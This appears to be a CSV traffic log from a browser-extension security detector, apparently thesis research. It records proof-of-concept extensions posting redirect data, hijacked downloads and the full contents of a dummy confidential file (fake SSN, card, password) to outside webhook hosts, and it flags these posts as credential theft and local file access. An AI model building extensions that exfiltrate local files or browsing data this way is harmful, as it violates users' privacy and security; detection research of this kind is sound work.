extension_id,extension_name,timestamp,scenario,source,origin,method,url,domain,resource_type,post_data_preview,request_headers_json,is_extension_initiated,is_unauthorized_domain,initiator_url,frame_url,host_permissions,content_script_matches,evidence_summary
ext4-hh,SafeLink Checker,2026-08-04T19:57:38.479,S4_HTTP_Site,Service Worker,chrome-extension://ext4-hh/,OPTIONS,https://see-poc-server-production.up.railway.app/webhook,see-poc-server-production.up.railway.app,other,,"{""origin"": ""chrome-extension://onhgkckhmalimlgpphkcpkfahnldmhbf""}",True,True,,,"""[]""","""[]""",OPTIONS to see-poc-server-production.up.railway.app; from extension service worker; [UNAUTHORIZED DOMAIN]
ext4-hh,SafeLink Checker,2026-08-04T19:57:43.965,S4_HTTP_Site,Service Worker,chrome-extension://ext4-hh/,POST,https://see-poc-server-production.up.railway.app/webhook,see-poc-server-production.up.railway.app,fetch,"{""extension"":""hh"",""extensionId"":""onhgkckhmalimlgpphkcpkfahnldmhbf"",""stats"":{""exfil_type"":""HTTP Hijacking (Redirect Detected)"",""original_url"":""https://iana.org/domains/example"",""final_url"":""https://www.iana.org/help/example-domains"",""transition_type"":""link"",""qualifiers"":[""server_redirect""]},""sentAt"":""2026-08-04T12:57:43.956Z""}","{""content-type"": ""application/json"", ""referer"": """"}",True,True,,,"""[]""","""[]""","POST to see-poc-server-production.up.railway.app; from extension service worker; [UNAUTHORIZED DOMAIN]; Flags: dom_scraping, download_hijack, http_redirect"
ext4-hh,SafeLink Checker,2026-08-04T19:57:50.995,S5_Login_Form,Service Worker,chrome-extension://ext4-hh/,OPTIONS,https://see-poc-server-production.up.railway.app/webhook,see-poc-server-production.up.railway.app,other,,"{""origin"": ""chrome-extension://onhgkckhmalimlgpphkcpkfahnldmhbf""}",True,True,,,"""[]""","""[]""",OPTIONS to see-poc-server-production.up.railway.app; from extension service worker; [UNAUTHORIZED DOMAIN]
ext4-hh,SafeLink Checker,2026-08-04T19:58:10.200,S6_Local_File,Service Worker,chrome-extension://ext4-hh/,POST,https://see-poc-server-production.up.railway.app/webhook,see-poc-server-production.up.railway.app,fetch,"{""extension"":""hh"",""extensionId"":""onhgkckhmalimlgpphkcpkfahnldmhbf"",""stats"":{""exfil_type"":""HTTP Hijacking (Redirect Detected)"",""original_url"":""https://the-internet.herokuapp.com/authenticate"",""final_url"":""https://the-internet.herokuapp.com/login"",""transition_type"":""form_submit"",""qualifiers"":[""server_redirect""]},""sentAt"":""2026-08-04T12:58:03.176Z""}","{""content-type"": ""application/json"", ""referer"": """"}",True,True,,,"""[]""","""[]""","POST to see-poc-server-production.up.railway.app; from extension service worker; [UNAUTHORIZED DOMAIN]; Flags: credential_theft, download_hijack, http_redirect"
ext4-hh,SafeLink Checker,2026-08-04T19:58:10.200,S6_Local_File,Service Worker,chrome-extension://ext4-hh/,OPTIONS,https://see-poc-server-production.up.railway.app/webhook,see-poc-server-production.up.railway.app,other,,"{""origin"": ""chrome-extension://onhgkckhmalimlgpphkcpkfahnldmhbf""}",True,True,,,"""[]""","""[]""",OPTIONS to see-poc-server-production.up.railway.app; from extension service worker; [UNAUTHORIZED DOMAIN]
ext5-udown,QuickSave Image,2026-08-04T20:00:37.261,S7_Download,Service Worker,chrome-extension://ext5-udown/,POST,https://see-serv-production.up.railway.app/webhook,see-serv-production.up.railway.app,fetch,"{""extension"":""udown"",""poc"":""QuickSave Image (Download Hijacking)"",""source"":""Service Worker (chrome.downloads Interceptor)"",""stats"":{""exfil_type"":""Active Download Hijacking"",""original_target_url"":""data:text/plain;charset=utf-8,TestCanaryDownloadPayload"",""original_filename"":""downloaded_file.png"",""action"":""REPLACED download with Cat Picture (https://http.cat/200.jpg)""},""sentAt"":""2026-08-04T13:00:34.246Z""}","{""content-type"": ""application/json"", ""referer"": """"}",True,True,,,"""[\""http://*/*\"", \""https://*/*\""]""","""[]""",POST to see-serv-production.up.railway.app; from extension service worker; [UNAUTHORIZED DOMAIN]; Flags: download_hijack
jliabnjloiaekdnkianbhplpdaoifmib,LocalPDF Viewer,2026-08-04T20:02:26.744,S6_Local_File,Service Worker,chrome-extension://jliabnjloiaekdnkianbhplpdaoifmib/,POST,https://see-poc-server-production.up.railway.app/webhook,see-poc-server-production.up.railway.app,fetch,"{""extension"":""lf"",""extensionId"":""diiecklhcghoolobpgaihmphmejgcfhp"",""stats"":{""exfil_type"":""Local File (file://)"",""file_path"":""file:///E:/Kuliah/Skripsi/Semhas/extension/see-detector/dynamic/see_traffic_capture/test_assets/dummy_secret.txt"",""file_snippet"":""CONFIDENTIAL — Personal Information Document\n=============================================\nFull Name: John Alexander Doe\nDate of Birth: March 15, 1985\n\nSocial Security Number: 123-45-6789\nDriver License: D1234567\n\nCredit Card (Visa): 4111-1111-1111-1111\nExpiration: 12/2028\nCVV: 321\n\nBank Account (Chase): 9876543210\nRouting Number: 021000021\n\nEmail: john.doe@personalmail.com\nPassword: MyS3cretP@ssw0rd!2026\nRecovery Phone: +1-555-867-5309\n\nHome Address:\n742 Evergreen Terrace\nSpringfield, IL 62704\n\nMedical Record ID: MRN-2026-00451\nInsurance Policy: HLT-9988776655\n""},""sentAt"":""2026-08-04T13:02:23.758Z""}","{""content-type"": ""application/json"", ""referer"": """"}",True,True,,,"""[\""file:///*\""]""","""[\""file:///*\""]""","POST to see-poc-server-production.up.railway.app; from extension service worker; [UNAUTHORIZED DOMAIN]; Flags: credential_theft, local_file_access"
jliabnjloiaekdnkianbhplpdaoifmib,LocalPDF Viewer,2026-08-04T20:02:26.777,S6_Local_File,Service Worker,chrome-extension://jliabnjloiaekdnkianbhplpdaoifmib/,OPTIONS,https://see-poc-server-production.up.railway.app/webhook,see-poc-server-production.up.railway.app,other,,"{""origin"": ""chrome-extension://diiecklhcghoolobpgaihmphmejgcfhp""}",True,True,,,"""[\""file:///*\""]""","""[\""file:///*\""]""",OPTIONS to see-poc-server-production.up.railway.app; from extension service worker; [UNAUTHORIZED DOMAIN]
jliabnjloiaekdnkianbhplpdaoifmib,LocalPDF Viewer,2026-08-04T20:04:34.943,S6_Local_File,Service Worker,chrome-extension://see_ext_f9dh50z0/,POST,https://see-poc-server-production.up.railway.app/webhook,see-poc-server-production.up.railway.app,fetch,"{""extension"":""lf"",""extensionId"":""ehmcpfijfedgknncokjmkbnlgieocjpd"",""stats"":{""exfil_type"":""Local File (file://)"",""file_path"":""file:///E:/Kuliah/Skripsi/Semhas/extension/see-detector/dynamic/see_traffic_capture/test_assets/dummy_secret.txt"",""file_snippet"":""CONFIDENTIAL — Personal Information Document\n=============================================\nFull Name: John Alexander Doe\nDate of Birth: March 15, 1985\n\nSocial Security Number: 123-45-6789\nDriver License: D1234567\n\nCredit Card (Visa): 4111-1111-1111-1111\nExpiration: 12/2028\nCVV: 321\n\nBank Account (Chase): 9876543210\nRouting Number: 021000021\n\nEmail: john.doe@personalmail.com\nPassword: MyS3cretP@ssw0rd!2026\nRecovery Phone: +1-555-867-5309\n\nHome Address:\n742 Evergreen Terrace\nSpringfield, IL 62704\n\nMedical Record ID: MRN-2026-00451\nInsurance Policy: HLT-9988776655\n""},""sentAt"":""2026-08-04T13:04:31.946Z""}","{""content-type"": ""application/json"", ""referer"": """"}",True,True,,,"""[\""file:///*\""]""","""[\""file:///*\""]""","POST to see-poc-server-production.up.railway.app; from extension service worker; [UNAUTHORIZED DOMAIN]; Flags: credential_theft, local_file_access"
jliabnjloiaekdnkianbhplpdaoifmib,LocalPDF Viewer,2026-08-04T20:04:34.944,S6_Local_File,Service Worker,chrome-extension://see_ext_f9dh50z0/,OPTIONS,https://see-poc-server-production.up.railway.app/webhook,see-poc-server-production.up.railway.app,other,,"{""origin"": ""chrome-extension://ehmcpfijfedgknncokjmkbnlgieocjpd""}",True,True,,,"""[\""file:///*\""]""","""[\""file:///*\""]""",OPTIONS to see-poc-server-production.up.railway.app; from extension service worker; [UNAUTHORIZED DOMAIN]
